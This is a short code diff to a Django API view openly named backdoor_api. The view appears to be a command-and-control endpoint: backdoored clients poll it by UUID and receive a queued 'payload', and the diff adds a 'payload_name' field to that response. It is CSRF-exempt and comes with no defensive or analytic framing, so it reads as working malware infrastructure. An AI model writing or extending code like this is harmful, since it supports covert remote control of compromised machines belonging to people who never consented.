@@ -34,20 +34,16 @@ def any_rest_api(request):
 @csrf_exempt
 @api_view(['GET', 'POST'])
 def backdoor_api(request, uuid):
-    if request.method == 'POST':
-        print(f'POST IS: {request.POST}')
-        if request.POST.get('active') == 'False':
-            active = False
-        return Response(request.POST)
-
     if request.method == 'GET':
         try:
             connection = Connection.objects.get(uuid=uuid)
             data = TempData.objects.get(connection_id=connection)
-            # output_list = [i.input for i in TempData.objects.all()]
-            # this['value'] = output_list[-1]
-            this = {'active': True, 'uuid': str(data.connection_id.uuid).upper(), 'payload': data.input}
-            print(this)
+            this = {'active': True, 'uuid': str(data.connection_id.uuid).upper(), 'payload': data.input,
+                    'payload_name': data.payload_name}
         except:
             this = {'active': False, 'uuid': 'None'}
         return Response(this)
+
+    if request.method == 'POST':
+        print(f'POST IS: {request.POST}')
+        return Response(request.POST)
